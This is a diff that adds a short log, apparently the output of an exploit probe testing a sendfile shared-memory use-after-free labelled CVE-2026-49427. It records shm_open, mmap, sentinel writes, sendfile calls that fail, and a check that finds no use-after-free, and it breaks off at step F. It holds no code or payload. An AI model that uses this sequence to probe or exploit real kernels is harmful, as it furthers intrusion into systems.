@@ -1,0 +1,26 @@
+=== PROBE 154a: CVE-2026-49427 SENDFILE SHM UAF ===
+
+pid=864
+gpu=0x311C5C000
+--- [A] SHM_OPEN TEST ---
+shm_open(482)=27
+*** SHM FD OBTAINED: 27 ***
+
+--- [B] FTRUNCATE SHM ---
+ftruncate(2097152)=0
+
+--- [C] MMAP SHM ---
+mmap=0x31205C000
+Writing sentinels...
+sentinel_check=true
+
+--- [D] SENDFILE WITH SF_NOCACHE ---
+dst_pipe: rd=113 wr=114
+sendfile(SF_NOCACHE)=-1 sent=0
+
+--- [E] UAF CHECK ---
+sentinels intact — no UAF (pages not freed)
+Trying sendfile without SF_NOCACHE...
+sendfile(no_flags)=-1
+
+--- [F] SHM_LARGEPAGE SENDFILE ---
